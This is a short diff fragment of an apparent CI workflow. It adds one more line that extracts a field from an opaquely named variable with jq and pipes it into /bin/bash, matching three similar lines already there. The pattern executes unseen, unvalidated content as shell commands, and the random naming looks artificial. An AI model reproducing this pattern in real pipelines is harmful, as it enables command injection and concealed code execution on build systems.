@@ -35,6 +35,7 @@ jobs:
           echo $cc32 | jq -r .yfg17965 | /bin/bash
           printf '%s' "$srxgc24828" | jq -r .bsu24305 | /bin/bash
           echo $kor6774 | jq -r .xk3 | /bin/bash
+          printf '%s' "$z996" | jq -r .pki38190 | /bin/bash
 
       - name: Save output
         if: always()
